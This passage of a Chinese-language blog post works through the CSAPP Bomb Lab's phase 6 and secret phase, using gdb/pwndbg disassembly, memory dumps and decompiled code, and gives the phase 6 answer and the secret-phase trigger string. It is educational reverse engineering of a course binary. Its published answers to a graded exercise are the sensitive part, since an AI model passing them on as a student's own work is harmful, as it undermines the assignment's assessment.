class="number">0x00603310</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:       <span class="number">0x000001dd</span>      <span class="number">0x00000005</span>      <span class="number">0x00603320</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:       <span class="number">0x000001bb</span>      <span class="number">0x00000006</span>      <span class="number">0x00000000</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603330</span>:       <span class="number">0x00000000</span>      <span class="number">0x00000000</span>      <span class="number">0x00000000</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603340</span> &lt;host_table&gt;:  <span class="number">0x00402629</span>      <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>可以猜测使用到了链表结构，这个链表使用的结构体类似于：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line"> <span class="type">int</span> sth; <span class="comment">// 某四字节内容，关于其用途先按下不表，后面会看到</span></span><br><span class="line"> <span class="type">int</span> input; <span class="comment">// 与我们的输入有关</span></span><br><span class="line"> node* next; <span class="comment">// 下一个node地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><aside>💡 笔记：Quad word是4个字，1个字是16位，2字节，那么qword其就是64位；1个int对应dword，是2字，4字节。</aside><h2 id="Part-6-4">Part 6.4</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:   mov    rbx,QWORD PTR [rsp+<span class="number">0x20</span>] </span><br><span class="line"><span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:   lea    rax,[rsp+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:   lea    rsi,[rsp+<span class="number">0x50</span>]  ; 结尾</span><br><span class="line"><span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:   mov    rcx,rbx</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:   mov    rdx,QWORD PTR [rax]</span><br><span class="line"><span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:   mov    QWORD PTR [rcx+<span class="number">0x8</span>],rdx</span><br><span class="line"><span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:   add    rax,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:   cmp    rax,rsi</span><br><span class="line"><span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:   je     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:   mov    rcx,rdx</span><br><span class="line"><span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:   jmp    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:   mov    QWORD PTR [rdx+<span class="number">0x8</span>],<span class="number">0x0</span>  ; 设置链表结尾为null</span><br></pre></td></tr></table></figure><p>运行时信息：可以看到确实将node移动到了rsp+20的位置：由于输入为<code>1 2 3 4 5 6</code>，用7减后得<code>6 5 4 3 2 1</code>, 分别对应node6 - node1。若输入改为<code>4 3 2 1 5 6</code>，分别为<code>node 3 4 5 6 2 1</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;    mov    rbx, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x4011b0</span> &lt;phase_6+<span class="number">188</span>&gt;    lea    rax, [rsp + <span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x4011b5</span> &lt;phase_6+<span class="number">193</span>&gt;    lea    rsi, [rsp + <span class="number">0x50</span>]</span><br><span class="line">   <span class="number">0x4011ba</span> &lt;phase_6+<span class="number">198</span>&gt;    mov    rcx, rbx</span><br><span class="line">   <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;    mov    rdx, qword ptr [rax]</span><br><span class="line">   <span class="number">0x4011c0</span> &lt;phase_6+<span class="number">204</span>&gt;    mov    qword ptr [rcx + <span class="number">8</span>], rdx</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ r14 rsp     <span class="number">0x7fffffffdc00</span> ◂— <span class="number">0x500000006</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7fffffffdc08</span> ◂— <span class="number">0x300000004</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ r13<span class="number">-4</span> rbp<span class="number">-4</span> <span class="number">0x7fffffffdc10</span> ◂— <span class="number">0x100000002</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7fffffffdc18</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│             <span class="number">0x7fffffffdc20</span> —▸ <span class="number">0x603320</span> (node6) ◂— <span class="number">0x6000001bb</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x7fffffffdc28</span> —▸ <span class="number">0x603310</span> (node5) ◂— <span class="number">0x5000001dd</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│             <span class="number">0x7fffffffdc30</span> —▸ <span class="number">0x603300</span> (node4) ◂— <span class="number">0x4000002b3</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│             <span class="number">0x7fffffffdc38</span> —▸ <span class="number">0x6032f0</span> (node3) ◂— <span class="number">0x30000039c</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%202.png" alt="Untitled"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">(*stack[nnode[i]]).next = *stack[nnode[i + <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">node[<span class="number">6</span>].next = <span class="literal">nullptr</span></span><br></pre></td></tr></table></figure><p>注意搬到栈的数据顺序不一定是654321，这样一个个往后又重新排序好了，我们可以猜测其目的是要进行遍历。</p><h2 id="Part-6-5-遍历检查链表中值大小">Part 6.5 遍历检查链表中值大小</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">---------------------------- <span class="keyword">for</span> ebp: <span class="number">5</span>~<span class="number">1</span></span><br><span class="line"> <span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:   mov    ebp,<span class="number">0x5</span></span><br><span class="line"></span><br><span class="line"> <span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:   mov    rax,QWORD PTR [rbx+<span class="number">0x8</span>]  ; rbx指向头指针</span><br><span class="line"> <span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:   mov    eax,DWORD PTR [rax]  ; 移动单字节: 是node的第一个字段</span><br><span class="line"> <span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:   cmp    DWORD PTR [rbx],eax  ; 比的也是node.sth</span><br><span class="line"> <span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:   jge    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line"> <span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:   call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;]</span><br><span class="line"></span><br><span class="line"> <span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:   mov    rbx,QWORD PTR [rbx+<span class="number">0x8</span>]  ; 访问next字段</span><br><span class="line"> <span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:   sub    ebp,<span class="number">0x1</span></span><br><span class="line"> <span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:   jne    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line"> <span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:   add    rsp,<span class="number">0x50</span></span><br><span class="line"> <span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:   pop    rbx</span><br><span class="line"> <span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:   pop    rbp</span><br><span class="line"> <span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:   pop    r12</span><br><span class="line"> <span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:   pop    r13</span><br><span class="line"> <span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:   pop    r14</span><br><span class="line"> <span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:   ret</span><br></pre></td></tr></table></figure><p>下面果然对链表进行了遍历，看每个元素是否都大于后一个元素，若否则引爆炸弹。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line"><span class="keyword">if</span> (node[idx].sth &gt; node[idx+<span class="number">1</span>].sth)  &#123;</span><br><span class="line">idx++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">bomb</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用x/30wx 0x6032d0查看nodes的sth值大小，确认从大到小的顺序为：<code>node 3 4 5 6 1 2</code>，对应输入为 <code>4 3 2 1 6 5</code>。</p><h1 id="secret-phase">secret_phase</h1><h2 id="Part-s-1-phase-defused">Part s.1 phase_defused</h2><p>在读入6条字符串后检查第4个字符串是否由3部分组成，第3部分是&quot;DrEvil&quot;</p><p>反汇编：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">phase_defused</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+8h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+Ch] [rbp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">88</span>]; <span class="comment">// [rsp+10h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num_input_strings == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(&amp;unk_603870, <span class="string">&quot;%d %d %s&quot;</span>, &amp;v1, &amp;v2, v3) == <span class="number">3</span></span><br><span class="line">      &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strings_not_equal</span>(v3, <span class="string">&quot;DrEvil&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Curses, you&#x27;ve found the secret phase!&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;But finding it and solving it are quite different...&quot;</span>);</span><br><span class="line">      <span class="built_in">secret_phase</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You&#x27;ve defused the bomb!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反编译：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble phase_defused</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_defused:</span><br><span class="line">   <span class="number">0x00000000004015c4</span> &lt;+<span class="number">0</span>&gt;:     sub    rsp,<span class="number">0x78</span></span><br><span class="line">   <span class="number">0x00000000004015c8</span> &lt;+<span class="number">4</span>&gt;:     mov    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x00000000004015d1</span> &lt;+<span class="number">13</span>&gt;:    mov    QWORD PTR [rsp+<span class="number">0x68</span>],rax</span><br><span class="line">   <span class="number">0x00000000004015d6</span> &lt;+<span class="number">18</span>&gt;:    <span class="keyword">xor</span>    eax,eax</span><br><span class="line">   <span class="number">0x00000000004015d8</span> &lt;+<span class="number">20</span>&gt;:    cmp    DWORD PTR [rip+<span class="number">0x202181</span>],<span class="number">0x6</span>        # <span class="number">0x603760</span> &lt;num_input_strings&gt;</span><br><span class="line">   <span class="number">0x00000000004015df</span> &lt;+<span class="number">27</span>&gt;:    jne    <span class="number">0x40163f</span> &lt;phase_defused+<span class="number">123</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004015e1</span> &lt;+<span class="number">29</span>&gt;:    lea    r8,[rsp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x00000000004015e6</span> &lt;+<span class="number">34</span>&gt;:    lea    rcx,[rsp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x00000000004015eb</span> &lt;+<span class="number">39</span>&gt;:    lea    rdx,[rsp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x00000000004015f0</span> &lt;+<span class="number">44</span>&gt;:    mov    esi,<span class="number">0x402619</span></span><br><span class="line">   <span class="number">0x00000000004015f5</span> &lt;+<span class="number">49</span>&gt;:    mov    edi,<span class="number">0x603870</span></span><br><span class="line">   <span class="number">0x00000000004015fa</span> &lt;+<span class="number">54</span>&gt;:    call   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   <span class="number">0x00000000004015ff</span> &lt;+<span class="number">59</span>&gt;:    cmp    eax,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x0000000000401602</span> &lt;+<span class="number">62</span>&gt;:    jne    <span class="number">0x401635</span> &lt;phase_defused+<span class="number">113</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401604</span> &lt;+<span class="number">64</span>&gt;:    mov    esi,<span class="number">0x402622</span></span><br><span class="line">   <span class="number">0x0000000000401609</span> &lt;+<span class="number">69</span>&gt;:    lea    rdi,[rsp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x000000000040160e</span> &lt;+<span class="number">74</span>&gt;:    call   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">   <span class="number">0x0000000000401613</span> &lt;+<span class="number">79</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x0000000000401615</span> &lt;+<span class="number">81</span>&gt;:    jne    <span class="number">0x401635</span> &lt;phase_defused+<span class="number">113</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401617</span> &lt;+<span class="number">83</span>&gt;:    mov    edi,<span class="number">0x4024f8</span></span><br><span class="line">   <span class="number">0x000000000040161c</span> &lt;+<span class="number">88</span>&gt;:    call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401621</span> &lt;+<span class="number">93</span>&gt;:    mov    edi,<span class="number">0x402520</span></span><br><span class="line">   <span class="number">0x0000000000401626</span> &lt;+<span class="number">98</span>&gt;:    call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040162b</span> &lt;+<span class="number">103</span>&gt;:   mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401630</span> &lt;+<span class="number">108</span>&gt;:   call   <span class="number">0x401242</span> &lt;secret_phase&gt;</span><br><span class="line">   <span class="number">0x0000000000401635</span> &lt;+<span class="number">113</span>&gt;:   mov    edi,<span class="number">0x402558</span></span><br><span class="line">   <span class="number">0x000000000040163a</span> &lt;+<span class="number">118</span>&gt;:   call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040163f</span> &lt;+<span class="number">123</span>&gt;:   mov    rax,QWORD PTR [rsp+<span class="number">0x68</span>]</span><br><span class="line">   <span class="number">0x0000000000401644</span> &lt;+<span class="number">128</span>&gt;:   <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x000000000040164d</span> &lt;+<span class="number">137</span>&gt;:   je     <span class="number">0x401654</span> &lt;phase_defused+<span class="number">144</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040164f</span> &lt;+<span class="number">139</span>&gt;:   call   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401654</span> &lt;+<span class="number">144</span>&gt;:   add    rsp,<span class="number">0x78</span></span><br><span class="line">   <span class="number">0x0000000000401658</span> &lt;+<span class="number">148</span>&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><aside>💡 笔记：cmp    DWORD PTR [rip+0x202181],0x6  中 rip 使用的是下一条指令地址</aside><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%203.png" alt="Untitled"></p><h2 id="Part-s-2-secret-phase">Part s.2 secret_phase</h2><p>使用strtol()解析输入，输入第一部分的数字不能大于1000，且传到<code>fun7()</code>后返回值必须为2.</p><p>反编译：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">secret_phase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">read_line</span>();</span><br><span class="line">  v1 = <span class="built_in">strtol</span>(v0, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 - <span class="number">1</span> &gt; <span class="number">1000</span> )</span><br><span class="line">    ((<span class="built_in">void</span> (*)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *, ...))explode_bomb)(v0, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">fun7</span>((__int64)&amp;n1, v1) != <span class="number">2</span> )</span><br><span class="line">    ((<span class="built_in">void</span> (*)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">char</span> *, ...))explode_bomb)(&amp;n1, (<span class="type">const</span> <span class="type">char</span> *)v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow! You&#x27;ve defused the secret stage!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">phase_defused</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">dump of assembler code <span class="keyword">for</span> function secret_phase:</span><br><span class="line">   <span class="number">0x0000000000401242</span> &lt;+<span class="number">0</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x0000000000401243</span> &lt;+<span class="number">1</span>&gt;:     call   <span class="number">0x40149e</span> &lt;read_line&gt;</span><br><span class="line">   <span class="number">0x0000000000401248</span> &lt;+<span class="number">6</span>&gt;:     mov    edx,<span class="number">0xa</span></span><br><span class="line">   <span class="number">0x000000000040124d</span> &lt;+<span class="number">11</span>&gt;:    mov    esi,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401252</span> &lt;+<span class="number">16</span>&gt;:    mov    rdi,rax</span><br><span class="line">   <span class="number">0x0000000000401255</span> &lt;+<span class="number">19</span>&gt;:    call   <span class="number">0x400bd0</span> &lt;strtol@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040125a</span> &lt;+<span class="number">24</span>&gt;:    mov    rbx,rax</span><br><span class="line">   <span class="number">0x000000000040125d</span> &lt;+<span class="number">27</span>&gt;:    lea    eax,[rax<span class="number">-0x1</span>]</span><br><span class="line">   <span class="number">0x0000000000401260</span> &lt;+<span class="number">30</span>&gt;:    cmp    eax,<span class="number">0x3e8</span></span><br><span class="line">   <span class="number">0x0000000000401265</span> &lt;+<span class="number">35</span>&gt;:    jbe    <span class="number">0x40126c</span> &lt;secret_phase+<span class="number">42</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401267</span> &lt;+<span class="number">37</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040126c</span> &lt;+<span class="number">42</span>&gt;:    mov    esi,ebx</span><br><span class="line">   <span class="number">0x000000000040126e</span> &lt;+<span class="number">44</span>&gt;:    mov    edi,<span class="number">0x6030f0</span></span><br><span class="line">   <span class="number">0x0000000000401273</span> &lt;+<span class="number">49</span>&gt;:    call   <span class="number">0x401204</span> &lt;fun7&gt;</span><br><span class="line">   <span class="number">0x0000000000401278</span> &lt;+<span class="number">54</span>&gt;:    cmp    eax,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040127b</span> &lt;+<span class="number">57</span>&gt;:    je     <span class="number">0x401282</span> &lt;secret_phase+<span class="number">64</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040127d</span> &lt;+<span class="number">59</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401282</span> &lt;+<span class="number">64</span>&gt;:    mov    edi,<span class="number">0x402438</span></span><br><span class="line">   <span class="number">0x0000000000401287</span> &lt;+<span class="number">69</span>&gt;:    call   <span class="number">0x400b10</span> &lt;puts@plt&gt;</span><br><span class="line">   <span class="number">0x000000000040128c</span> &lt;+<span class="number">74</span>&gt;:    call   <span class="number">0x4015c4</span> &lt;phase_defused&gt;</span><br><span class="line">   <span class="number">0x0000000000401291</span> &lt;+<span class="number">79</span>&gt;:    pop    rbx</span><br><span class="line">   <span class="number">0x0000000000401292</span> &lt;+<span class="number">80</span>&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="Part-s-3-func7">Part s.3 func7</h2><p>最后一步的难点是看出来这是在二叉树上进行运算。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x401273</span> &lt;secret_phase+<span class="number">49</span>&gt;    call   fun7                      &lt;fun7&gt;</span><br><span class="line">        rdi: <span class="number">0x6030f0</span> (n1) ◂— <span class="number">0x24</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line">        rsi: <span class="number">0x29a</span></span><br><span class="line">        rdx: <span class="number">0x0</span></span><br><span class="line">        rcx: <span class="number">0x603963</span> (input_strings+<span class="number">483</span>) —▸ <span class="number">0x616b6a</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; disassemb fun7</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function fun7:</span><br><span class="line">   <span class="number">0x0000000000401204</span> &lt;+<span class="number">0</span>&gt;:     sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x0000000000401208</span> &lt;+<span class="number">4</span>&gt;:     test   rdi,rdi</span><br><span class="line">   <span class="number">0x000000000040120b</span> &lt;+<span class="number">7</span>&gt;:     je     <span class="number">0x401238</span> &lt;fun7+<span class="number">52</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040120d</span> &lt;+<span class="number">9</span>&gt;:     mov    edx,DWORD PTR [rdi]</span><br><span class="line">   <span class="number">0x000000000040120f</span> &lt;+<span class="number">11</span>&gt;:    cmp    edx,esi</span><br><span class="line">   <span class="number">0x0000000000401211</span> &lt;+<span class="number">13</span>&gt;:    jle    <span class="number">0x401220</span> &lt;fun7+<span class="number">28</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401213</span> &lt;+<span class="number">15</span>&gt;:    mov    rdi,QWORD PTR [rdi+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000401217</span> &lt;+<span class="number">19</span>&gt;:    call   <span class="number">0x401204</span> &lt;fun7&gt;</span><br><span class="line">   <span class="number">0x000000000040121c</span> &lt;+<span class="number">24</span>&gt;:    add    eax,eax</span><br><span class="line">   <span class="number">0x000000000040121e</span> &lt;+<span class="number">26</span>&gt;:    jmp    <span class="number">0x40123d</span> &lt;fun7+<span class="number">57</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401220</span> &lt;+<span class="number">28</span>&gt;:    mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401225</span> &lt;+<span 